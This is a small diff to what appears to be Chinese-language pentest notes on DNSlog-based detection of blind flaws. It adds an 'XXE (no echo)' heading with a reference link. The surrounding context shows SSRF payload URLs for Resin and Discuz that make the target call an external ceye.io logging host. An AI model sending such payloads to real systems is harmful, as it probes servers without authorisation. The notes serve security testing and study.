@@ -162,5 +162,7 @@ xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.por
 http://xxx.xxxx.com/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&formhash=xxoo
 ```
 
+### 0x01.11 xxe\(无回显\)
 
+参考[https://www.secpulse.com/archives/49194.html](https://www.secpulse.com/archives/49194.html)![](/assets/dnslog7.png)![](/assets/dnslog8.png)
 
